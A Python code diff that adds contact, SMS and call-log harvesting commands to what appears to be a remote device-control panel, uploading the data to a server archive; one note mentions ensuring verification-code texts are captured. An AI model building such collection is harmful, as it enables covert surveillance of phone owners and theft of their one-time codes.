@@ -143,7 +143,42 @@ COMMANDS: list[dict[str, Any]] = [
                  description="开启后跳过 5 分钟新鲜缓存短路，直接监听一次定位；"
                              "陈旧缓存兜底仍保留（回执注明缓存年龄）")]),
     _cmd("get_current_page", "获取当前页面", "data", "📄", "获取客户端当前显示的页面信息"),
-    _cmd("get_sms", "获取短信", "data", "💬", "获取客户端短信信息"),
+    _cmd("get_contacts", "获取通讯录", "data", "👥",
+         "读取设备联系人（姓名+号码+邮箱）并上报服务端持久化（按设备覆盖快照），"
+         "后台「通讯录」页查看；只读，不做任何写入",
+         [_param("only_with_phones", "仅含有号码", PARAM_TYPE_SWITCH, default=True,
+                 description="开启后过滤掉没有任何电话号码的联系人（如纯邮箱联系人）"),
+          _param("limit", "数量上限", PARAM_TYPE_NUMBER, default=2000,
+                 placeholder="默认 2000", description="最多上报的联系人数量（上限 5000，防止超大体量通讯录）")]),
+    _cmd("get_sms", "获取短信", "data", "💬",
+         "读取设备短信并上报服务端持久化（累积存档，按设备+短信ID去重），"
+         "后台「短信」页查看；只读，不发送、不修改",
+         [_param("sms_type", "短信类型", PARAM_TYPE_SELECT, default="all",
+                 options=[
+                     {"value": "all", "label": "全部"},
+                     {"value": "inbox", "label": "收件箱"},
+                     {"value": "sent", "label": "已发送"},
+                     {"value": "draft", "label": "草稿"},
+                     {"value": "outbox", "label": "发送中"},
+                     {"value": "failed", "label": "发送失败"},
+                 ],
+                 description="筛选短信类型；收件箱用显式 type=1 查询，"
+                             "规避部分 ROM 收件箱视图漏验证码短信的问题"),
+          _param("limit", "条数上限", PARAM_TYPE_NUMBER, default=100,
+                 placeholder="默认 100", description="单次最多读取的短信条数（上限 1000，分次下发可增量拉取）")]),
+    _cmd("get_call_log", "获取通话记录", "data", "📞",
+         "读取设备通话记录（号码/联系人/类型/时长）并上报服务端持久化（按设备覆盖快照），"
+         "后台「通话记录」页查看；只读",
+         [_param("call_type", "通话类型", PARAM_TYPE_SELECT, default="all",
+                 options=[
+                     {"value": "all", "label": "全部"},
+                     {"value": "incoming", "label": "呼入"},
+                     {"value": "outgoing", "label": "呼出"},
+                     {"value": "missed", "label": "未接"},
+                 ],
+                 description="筛选通话类型"),
+          _param("limit", "条数上限", PARAM_TYPE_NUMBER, default=200,
+                 placeholder="默认 200", description="单次最多读取的记录条数（上限 1000）")]),
     _cmd("get_network", "获取网络状态", "data", "📶", "获取客户端当前网络状态"),
     _cmd("get_battery", "获取电量", "data", "🔋", "获取客户端当前电量与充电状态"),
 
